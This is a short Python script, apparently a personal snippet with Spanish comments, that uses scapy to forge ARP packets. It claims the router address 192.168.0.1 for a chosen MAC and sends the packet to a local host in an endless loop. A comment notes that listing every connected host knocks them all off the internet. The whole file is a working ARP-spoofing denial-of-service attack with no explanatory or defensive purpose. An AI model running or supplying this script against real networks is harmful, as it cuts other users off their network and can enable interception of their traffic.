from scapy.all import ARP, Ether, sendp

package = Ether() / ARP(op="who-has", pdst="192.168.0.28", psrc="192.168.0.1", hwsrc="40:f0:2f:8c:1a:e5")#hwsrc es la mac
# si le pasamos una lista con los conectados a la red en pdst los deja a todos sin internet

while True:
    sendp(package, verbose=False)
